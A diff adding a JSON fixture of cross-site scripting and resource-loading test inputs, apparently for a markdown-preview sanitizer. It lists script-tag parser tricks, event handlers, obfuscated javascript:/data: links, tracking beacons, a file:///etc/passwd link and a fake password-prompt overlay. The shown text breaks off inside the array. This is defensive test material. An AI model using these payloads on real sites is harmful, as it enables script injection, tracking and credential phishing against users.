@@ -1,0 +1,1397 @@
+[
+  {
+    "name": "markdown-preview: script element",
+    "html": "<script>{{CANARY}}</script>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: script element with a source of the package",
+    "html": "<script src=\"/assets/index.js\"></script>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: img with onerror",
+    "html": "<img src=\"http://img.invalid/a.png\" onerror=\"{{CANARY}}\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: svg with onload and a script",
+    "html": "<svg onload=\"{{CANARY}}\"><script>{{CANARY}}</script></svg>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: anchor with onclick",
+    "html": "<a href=\"#\" onclick=\"{{CANARY}}\">x</a>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: body onload",
+    "html": "<body onload=\"{{CANARY}}\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: details ontoggle",
+    "html": "<details open ontoggle=\"{{CANARY}}\"><summary>More</summary>x</details>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: HTML block of several lines",
+    "html": "<div\nonmouseover=\"{{CANARY}}\">\n\n*md*\n\n</div>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: HTML comment hiding a script",
+    "html": "<!-- --><script>{{CANARY}}</script><!-- -->",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: CDATA and processing instruction",
+    "html": "<![CDATA[<script>x</script>]]><?php echo 1 ?>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: picture with srcset",
+    "html": "<picture><source srcset=\"http://img.invalid/a.webp 1x\"><img src=\"http://img.invalid/b.png\" srcset=\"http://img.invalid/c.png 2x\"></picture>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: video with src and poster",
+    "html": "<video src=\"http://media.invalid/v.mp4\" poster=\"http://img.invalid/p.png\" autoplay></video>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: audio with source",
+    "html": "<audio autoplay><source src=\"http://media.invalid/a.mp3\"></audio>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: iframe",
+    "html": "<iframe src=\"http://frame.invalid/\" srcdoc=\"<script>parent.__hpPwned=1</script>\"></iframe>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: object",
+    "html": "<object data=\"http://object.invalid/x.swf\"></object>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: embed",
+    "html": "<embed src=\"http://embed.invalid/x\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: link stylesheet",
+    "html": "<link rel=\"stylesheet\" href=\"http://css.invalid/a.css\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: link dns-prefetch and preconnect",
+    "html": "<link rel=\"dns-prefetch\" href=\"//dns.invalid\"><link rel=\"preconnect\" href=\"http://preconnect.invalid\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: link prefetch and preload",
+    "html": "<link rel=\"prefetch\" href=\"http://prefetch.invalid/a\"><link rel=\"preload\" as=\"image\" href=\"http://preload.invalid/a.png\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: style with @import and url()",
+    "html": "<style>@import url(http://css.invalid/import.css); body { background: url(http://css.invalid/bg.png) }</style>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: inline style with url()",
+    "html": "<div style=\"background:url(http://css.invalid/inline.png);position:fixed;inset:0\">x</div>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: svg use and image",
+    "html": "<svg><use href=\"http://svg.invalid/s.svg#a\"/><image href=\"http://img.invalid/svg.png\"/></svg>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: meta refresh",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=http://nav.invalid/\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: base",
+    "html": "<base href=\"http://base.invalid/\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: form with action",
+    "html": "<form action=\"http://form.invalid/\" method=\"post\"><input name=\"q\"><button>Go</button></form>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: anchor with ping",
+    "html": "<a href=\"http://ok.invalid/\" ping=\"http://ping.invalid/\">ping</a>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: input type image",
+    "html": "<input type=\"image\" src=\"http://img.invalid/input.png\">",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: background attribute",
+    "html": "<table background=\"http://img.invalid/table.png\"><tr><td>x</td></tr></table>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: markup imitating the extension's interface",
+    "html": "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:white\">Settings — enter your master password <input type=\"password\"></div>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: entities spelling a script",
+    "html": "&lt;script&gt;parent.__hpPwned=1&lt;/script&gt; &#60;img src=x onerror=alert(1)&#62;",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link",
+    "html": "[x](javascript:{{CANARY}})",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, mixed case",
+    "html": "[x](JaVaScRiPt:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, entity for a letter",
+    "html": "[x](&#106;avascript:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, entity for the colon",
+    "html": "[x](javascript&colon;alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, tab as an entity",
+    "html": "[x](java&#x09;script:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, tab as a percent escape",
+    "html": "[x](java%09script:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, line break inside brackets",
+    "html": "[x](<java\nscript:alert(1)>)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, leading control character",
+    "html": "[x](\u0001javascript:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, leading control character as an entity",
+    "html": "[x](&#1;javascript:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link, leading space in brackets",
+    "html": "[x](< javascript:alert(1)>)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: link in angle brackets",
+    "html": "[x](<javascript:alert(1)>)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: autolink",
+    "html": "<javascript:alert(1)>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: reference definition",
+    "html": "[x]\n\n[x]: javascript:alert(1)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: javascript: image",
+    "html": "![x](javascript:alert(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: vbscript: link",
+    "html": "[x](vbscript:msgbox(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: vbscript: link, mixed case",
+    "html": "[x](VbScRiPt:msgbox(1))",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: data: link",
+    "html": "[x](data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX19tZFB3bmVkPTE8L3NjcmlwdD4=)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: data: link, upper case",
+    "html": "[x](DATA:text/html,<script>alert(1)</script>)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: data: autolink",
+    "html": "<data:text/html,x>",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: file: link",
+    "html": "[x](file:///etc/passwd)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: unknown scheme",
+    "html": "[x](chrome://settings) [y](chrome-extension://abc/x.html) [z](blob:http://x.invalid/1)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: protocol-relative link",
+    "html": "[x](//nav.invalid/x)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: link title breaking out of its attribute",
+    "html": "[x](http://ok.invalid/ \"a\\\" onmouseover=\\\"{{CANARY}}\")",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: link text with a tag",
+    "html": "[<img src=x onerror={{CANARY}}>](http://ok.invalid/)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: fence info breaking out of its class",
+    "html": "```\" onclick=\"{{CANARY}}\ncode\n```",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: fence info with a handler",
+    "html": "```js onmouseover=alert(1)\ncode\n```",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: remote image",
+    "html": "![a](http://img.invalid/md.png)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: remote image by reference",
+    "html": "![a][r]\n\n[r]: http://img.invalid/ref.png",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: image inside a link",
+    "html": "[![a](http://img.invalid/in-link.png)](http://ok.invalid/)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: protocol-relative image",
+    "html": "![a](//img.invalid/proto-relative.png)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: image on a local port",
+    "html": "![a](http://127.0.0.1:9/img.png)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: data: svg image with a script",
+    "html": "![a](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "markdown-preview: image alt with a tag",
+    "html": "![<img src=x onerror={{CANARY}}>](http://img.invalid/alt.png)",
+    "from": "markdown-preview"
+  },
+  {
+    "name": "script, inline",
+    "html": "<script>{{CANARY}}</script>"
+  },
+  {
+    "name": "script with a source of the package",
+    "html": "<script src=\"/theme-boot.js\"></script>"
+  },
+  {
+    "name": "script type=module, inline and with a source",
+    "html": "<script type=\"module\">{{CANARY}}</script><script type=\"module\" src=\"/theme-boot.js\"></script>"
+  },
+  {
+    "name": "script with a remote source, async and defer",
+    "html": "<script async defer src=\"http://script.invalid/a.js\"></script>"
+  },
+  {
+    "name": "script inside SVG",
+    "html": "<svg><script>{{CANARY}}</script><script href=\"/theme-boot.js\"></script><script xlink:href=\"/theme-boot.js\"></script></svg>"
+  },
+  {
+    "name": "script inside MathML",
+    "html": "<math><mi><script>{{CANARY}}</script></mi><script>{{CANARY}}</script></math>"
+  },
+  {
+    "name": "script in a table (the parser keeps it there)",
+    "html": "<table><script>{{CANARY}}</script><tr><td>cell</td></tr></table>"
+  },
+  {
+    "name": "script fostered out of a table",
+    "html": "<table>text<script>{{CANARY}}</script><tr><td>x</td></tr></table>"
+  },
+  {
+    "name": "script in a select",
+    "html": "<select><script>{{CANARY}}</script><option>a</option></select>"
+  },
+  {
+    "name": "script in SVG desc (back to HTML)",
+    "html": "<svg><desc><script>{{CANARY}}</script></desc></svg>"
+  },
+  {
+    "name": "script in a frameset document",
+    "html": "<frameset><script>{{CANARY}}</script><frame src=\"http://frame.invalid/\"></frameset>"
+  },
+  {
+    "name": "script after </html>",
+    "html": "<html><body>x</body></html><script>{{CANARY}}</script>"
+  },
+  {
+    "name": "script in noscript",
+    "html": "<noscript><script>{{CANARY}}</script></noscript>"
+  },
+  {
+    "name": "script split by a comment",
+    "html": "<scr<!-- -->ipt>{{CANARY}}</scr<!-- -->ipt>"
+  },
+  {
+    "name": "script with a NUL in its name",
+    "html": "<scr\u0000ipt>{{CANARY}}</script>"
+  },
+  {
+    "name": "script in an attribute value",
+    "html": "<p title=\"<script>{{CANARY}}</script>\">x</p>"
+  },
+  {
+    "name": "event handler onload",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onload=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onerror",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onerror=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onclick",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onclick=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ondblclick",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ondblclick=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmousedown",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmousedown=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmouseup",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmouseup=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmouseover",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmouseover=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmouseenter",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmouseenter=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmousemove",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmousemove=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmouseleave",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmouseleave=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onpointerdown",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onpointerdown=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onpointerenter",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onpointerenter=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onpointerover",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onpointerover=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onfocus",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onfocus=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onfocusin",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onfocusin=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onblur",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onblur=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onkeydown",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onkeydown=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onkeyup",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onkeyup=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oninput",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oninput=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onchange",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onchange=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onsubmit",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onsubmit=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onreset",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onreset=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oninvalid",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oninvalid=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onselect",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onselect=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onscroll",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onscroll=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onscrollend",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onscrollend=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onwheel",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onwheel=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onanimationstart",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onanimationstart=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onanimationend",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onanimationend=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onanimationiteration",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onanimationiteration=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ontransitionend",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ontransitionend=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ontransitionrun",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ontransitionrun=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ontoggle",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ontoggle=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onbeforetoggle",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onbeforetoggle=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onbeforematch",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onbeforematch=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oncontextmenu",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oncontextmenu=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onauxclick",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onauxclick=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ondrag",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ondrag=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ondragstart",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ondragstart=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler ondrop",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" ondrop=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oncopy",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oncopy=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onpaste",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onpaste=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onresize",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onresize=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onpageshow",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onpageshow=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onhashchange",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onhashchange=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onmessage",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onmessage=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onbegin",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onbegin=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onend",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onend=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onrepeat",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onrepeat=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onplay",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onplay=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oncanplay",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oncanplay=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onloadstart",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onloadstart=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler onsearch",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" onsearch=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler oncontentvisibilityautostatechange",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" oncontentvisibilityautostatechange=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "event handler OnClIcK",
+    "html": "<style>@keyframes hp { from { opacity: 0.99 } to { opacity: 1 } } .hp { animation: hp 10ms 2; transition: color 1ms }</style><div class=\"hp\" OnClIcK=\"{{CANARY}}\" tabindex=\"0\" autofocus>x</div>"
+  },
+  {
+    "name": "handlers on body, svg, details, marquee, video, input",
+    "html": "<body onpageshow=\"{{CANARY}}\"><svg onload=\"{{CANARY}}\"></svg><details open ontoggle=\"{{CANARY}}\"><summary>s</summary></details><marquee onstart=\"{{CANARY}}\">m</marquee><video autoplay onplay=\"{{CANARY}}\"></video><input autofocus onfocus=\"{{CANARY}}\">"
+  },
+  {
+    "name": "SVG animation with onbegin",
+    "html": "<svg><rect width=\"10\" height=\"10\"><animate onbegin=\"{{CANARY}}\" attributeName=\"x\" from=\"0\" to=\"5\" dur=\"10ms\"/></rect></svg>"
+  },
+  {
+    "name": "handler on a contenteditable that would take the focus",
+    "html": "<div contenteditable autofocus onfocus=\"{{CANARY}}\">edit</div>"
+  },
+  {
+    "name": "popover with onbeforetoggle",
+    "html": "<button popovertarget=\"p\">open</button><div popover id=\"p\" onbeforetoggle=\"{{CANARY}}\">pop</div>"
+  },
+  {
+    "name": "dialog opened by a command button",
+    "html": "<button command=\"show-modal\" commandfor=\"d\">open</button><dialog id=\"d\" oncancel=\"{{CANARY}}\" onclose=\"{{CANARY}}\">d</dialog>"
+  },
+  {
+    "name": "javascript: href",
+    "html": "<a href=\"javascript:{{CANARY}}\">a</a>"
+  },
+  {
+    "name": "javascript: href, spaced and mixed case",
+    "html": "<a href=\"  JaVaScRiPt:{{CANARY}}\">a</a>"
+  },
+  {
+    "name": "javascript: href, a tab inside",
+    "html": "<a href=\"java&#x09;script:{{CANARY}}\">a</a>"
+  },
+  {
+    "name": "javascript: href, entities",
+    "html": "<a href=\"&#106;&#x61;vascript&colon;{{CANARY}}\">a</a>"
+  },
+  {
+    "name": "javascript: href, leading control character",
+    "html": "<a href=\"\u0001javascript:{{CANARY}}\">a</a>"
+  },
+  {
+    "name": "vbscript: href",
+    "html": "<a href=\"vbscript:msgbox(1)\">a</a>"
+  },
+  {
+    "name": "data: href",
+    "html": "<a href=\"data:text/html,<script>{{CANARY}}</script>\">a</a>"
+  },
+  {
+    "name": "data: href, base64",
+    "html": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">a</a>"
+  },
+  {
+    "name": "javascript: area",
+    "html": "<img usemap=\"#m\" src=\"http://img.invalid/map.png\" width=\"10\" height=\"10\"><map name=\"m\"><area shape=\"rect\" coords=\"0,0,10,10\" href=\"javascript:{{CANARY}}\"></map>"
+  },
+  {
